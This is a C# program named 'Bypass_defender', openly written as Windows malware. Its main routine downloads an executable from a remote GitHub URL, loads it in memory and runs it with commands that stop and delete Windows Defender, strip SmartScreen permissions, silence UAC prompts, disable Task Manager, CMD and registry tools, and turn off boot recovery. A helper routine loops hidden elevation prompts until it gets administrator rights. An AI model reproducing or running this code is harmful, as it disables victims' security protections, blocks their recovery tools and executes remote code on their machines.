using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Resources;
using System.Globalization;
using System.Net;

namespace Bypass_defender
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //Application.SetHighDpiMode(HighDpiMode.SystemAware);
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            /*if(!(IsAdministrator()))
            {
                AdminForce();
            }*/

            object[] parametersArray = new object[] { "icacls \" % pop %\\System32\\smartscreen.exe\" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18",
                "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"  /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /d \"0\" /f",
                "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration\"  /v \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f",
                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\" /t REG_DWORD /d \"1\" /f",
                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableCMD\" /t REG_DWORD /d \"1\" /f",
                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableRegistryTools\" /t REG_DWORD /d \"1\" /f",
                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoRun\" /t REG_DWORD /d \"1\" /f",
                "sc stop  windefend",
                "sc delete  windefend",
                "bcdedit /set {default} recoveryenabled No",
                "bcdedit /set {default} bootstatuspolicy ignoreallfailures"};


            WebClient myWebClient = new WebClient();
            byte[] XSudo = myWebClient.DownloadData("https://raw.githubusercontent.com/Shinyenigma/XSudo-windows-hacker/main/XSudo.exe");

            Assembly asm = Assembly.Load(XSudo);
            asm.EntryPoint.Invoke(null,new object[] { parametersArray });



        }




        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        public static void AdminForce()
        {
            while (true)
            {
                // Elevate previleges
                if (!IsAdministrator())
                {
                    Console.WriteLine("[~] Trying elevate previleges to administrator...");
                    Process proc = new Process();
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.StartInfo.FileName = Application.ExecutablePath;
                    proc.StartInfo.Arguments = "";
                    proc.StartInfo.UseShellExecute = true;
                    proc.StartInfo.Verb = "runas";
                    proc.StartInfo.CreateNoWindow = true;
                    try
                    {
                        proc.Start();
                        proc.WaitForExit();
                        Environment.Exit(1);
                    }
                    catch (System.ComponentModel.Win32Exception)
                    {
                        continue;
                    }
                }
                else { break; }
            }
        }
    }
}
